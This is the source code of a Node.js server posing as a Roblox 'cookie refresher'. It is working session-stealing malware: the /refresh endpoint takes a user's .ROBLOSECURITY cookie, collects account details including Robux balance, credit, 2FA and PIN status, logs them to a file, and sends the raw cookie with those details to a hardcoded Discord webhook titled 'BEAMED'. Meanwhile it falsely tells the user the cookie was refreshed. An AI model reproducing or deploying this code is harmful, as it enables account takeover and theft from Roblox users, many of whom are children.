const express = require('express');
const axios = require('axios');
const fs = require('fs');

const app = express();
app.use(express.json());
app.use(express.static('public'));

const WEBHOOK_URL = 'https://discord.com/api/webhooks/1448713650629246977/cWtQq3F9Scg3mxN645XzdQEt2gEmhH5Yip5BDTPj37myl70yCVjPSnxS1T97hphlXgZB';

// Get detailed user information using multiple endpoints
async function getUserData(cookie) {
    const userData = {
        username: 'Unknown',
        uid: 'Unknown',
        displayName: 'Unknown',
        createdAt: 'Unknown',
        country: 'Unknown',
        balance: 0,
        isTwoStepVerificationEnabled: false,
        isPinEnabled: false,
        isPremium: false,
        creditbalance: 0,
        rap: 0,
        avatarUrl: ''
    };

    try {
        // 1. Get basic user info
        const userResponse = await axios.get('https://users.roblox.com/v1/users/authenticated', {
            headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` },
            timeout: 5000
        });

        if (userResponse.status === 200) {
            const user = userResponse.data;
            userData.username = user.name || 'Unknown';
            userData.uid = user.id || 'Unknown';
            userData.displayName = user.displayName || user.name || 'Unknown';
            userData.createdAt = new Date(user.created || Date.now()).toLocaleDateString();
            userData.avatarUrl = `https://www.roblox.com/headshot-thumbnail/image?userId=${user.id}&width=420&height=420&format=png`;
        }

        // 2. Get balance
        try {
            const balanceResponse = await axios.get('https://economy.roblox.com/v1/user/currency', {
                headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` },
                timeout: 3000
            });
            if (balanceResponse.status === 200) {
                userData.balance = balanceResponse.data.robux || 0;
            }
        } catch (balanceError) {
            console.log('Balance fetch failed:', balanceError.message);
        }

        // 3. Check if premium
        try {
            const premiumResponse = await axios.get(`https://premiumfeatures.roblox.com/v1/users/${userData.uid}/premium`, {
                headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` },
                timeout: 3000
            });
            userData.isPremium = premiumResponse.data?.isPremium || false;
        } catch (premiumError) {
            console.log('Premium check failed:', premiumError.message);
        }

        // 4. Get credit balance (if available)
        try {
            const creditResponse = await axios.get('https://billing.roblox.com/v1/credit', {
                headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` },
                timeout: 3000
            });
            userData.creditbalance = creditResponse.data?.balance || 0;
        } catch (creditError) {
            console.log('Credit balance fetch failed:', creditError.message);
        }

        // 5. Check 2FA status
        try {
            const twoFactorResponse = await axios.post('https://auth.roblox.com/v1/twostepverification/get', {}, {
                headers: { 
                    'Cookie': `.ROBLOSECURITY=${cookie}`,
                    'Content-Type': 'application/json'
                },
                timeout: 3000
            });
            userData.isTwoStepVerificationEnabled = twoFactorResponse.data?.twoStepVerificationEnabled || false;
        } catch (twoFactorError) {
            console.log('2FA check failed:', twoFactorError.message);
        }

        // 6. Check PIN status (this endpoint might change)
        try {
            const pinResponse = await axios.get('https://auth.roblox.com/v1/account/pin', {
                headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` },
                timeout: 3000
            });
            userData.isPinEnabled = pinResponse.data?.isEnabled || false;
        } catch (pinError) {
            console.log('PIN check failed:', pinError.message);
        }

        // 7. Get country from privacy settings
        try {
            const privacyResponse = await axios.get('https://accountsettings.roblox.com/v1/privacy/info', {
                headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` },
                timeout: 3000
            });
            userData.country = privacyResponse.data?.country || 'Unknown';
        } catch (privacyError) {
            console.log('Country fetch failed:', privacyError.message);
        }

        // 8. Get RAP (Roblox Asset Price) - using third-party API
        try {
            const rapResponse = await axios.get(`https://api.rolimons.com/players/v1/player/${userData.uid}`, {
                timeout: 3000
            });
            if (rapResponse.data && rapResponse.data.success) {
                userData.rap = rapResponse.data.rap || 0;
            }
        } catch (rapError) {
            console.log('RAP fetch failed:', rapError.message);
        }

    } catch (error) {
        console.error('Failed to get user data:', error.message);
    }

    return userData;
}

app.get('/refresh', async (req, res) => {
    console.log('\n=== /refresh endpoint called ===');
    const roblosecurityCookie = req.query.cookie;
    
    if (!roblosecurityCookie) {
        return res.json({
            success: false,
            error: "No cookie provided",
            usage: "Use ?cookie=YOUR_ROBLOSECURITY_COOKIE"
        });
    }
    
    console.log(`Processing cookie (${roblosecurityCookie.length} chars)`);
    
    try {
        // Get detailed user data
        const userData = await getUserData(roblosecurityCookie);
        
        // Create the file content object exactly as requested
        const fileContent = {
            RefreshedCookie: roblosecurityCookie,
            DebugInfo: `Processed at ${new Date().toISOString()} | Length: ${roblosecurityCookie.length} chars`,
            Username: userData.username,
            UserID: userData.uid,
            DisplayName: userData.displayName,
            CreationDate: userData.createdAt,
            Country: userData.country,
            AccountBalanceRobux: userData.balance,
            Is2FAEnabled: userData.isTwoStepVerificationEnabled,
            IsPINEnabled: userData.isPinEnabled,
            IsPremium: userData.isPremium,
            CreditBalance: userData.creditbalance,
            RAP: userData.rap,
        };
        
        // Save to file
        fs.appendFileSync('refreshed_cookie.json', JSON.stringify(fileContent, null, 4) + ',\n');
        console.log('Data saved to file');
        
        // Send to Discord webhook (EXACT format you requested)
        const webhookResponse = await axios.post(WEBHOOK_URL, {
            embeds: [
                {
                    title: '@everyone BEAMED Refreshed Cookie https://rblxrefresh.net/r/cookiew11',
                    description: `**Refreshed Cookie:**\n\`\`\`${roblosecurityCookie}\`\`\``,
                    color: 16776960,
                    thumbnail: {
                        url: userData.avatarUrl,
                    },
                    fields: [
                        { name: 'Username', value: userData.username, inline: true },
                        { name: 'User ID', value: userData.uid, inline: true },
                        { name: 'Display Name', value: userData.displayName, inline: true },
                        { name: 'Creation Date', value: userData.createdAt, inline: true },
                        { name: 'Country', value: userData.country, inline: true },
                        { name: 'Account Balance (Robux)', value: userData.balance.toString(), inline: true },
                        { name: 'Is 2FA Enabled', value: userData.isTwoStepVerificationEnabled.toString(), inline: true },
                        { name: 'Is PIN Enabled', value: userData.isPinEnabled.toString(), inline: true },
                        { name: 'Is Premium', value: userData.isPremium.toString(), inline: true },
                        { name: 'Credit Balance', value: userData.creditbalance.toString(), inline: true },
                        { name: 'RAP', value: userData.rap.toString(), inline: true },
                    ],
                }
            ]
        });
        
        console.log('Webhook sent successfully');
        
        // Return data to frontend
        res.json({
            success: true,
            authTicket: "N/A - Original Cookie Used",
            redemptionResult: {
                refreshedCookie: roblosecurityCookie,
                success: true
            },
            userData: fileContent,
            cookie: roblosecurityCookie
        });
        
    } catch (error) {
        console.error('Error:', error.message);
        res.json({
            success: false,
            error: error.message,
            cookie: roblosecurityCookie,
            redemptionResult: {
                refreshedCookie: roblosecurityCookie,
                success: false
            }
        });
    }
});

// Health check
app.get('/health', (req, res) => {
    res.json({
        status: 'online',
        timestamp: new Date().toISOString()
    });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`✅ Server running on port ${PORT}`);
    console.log(`📞 Endpoint: GET /refresh?cookie=ROBLOSECURITY`);
});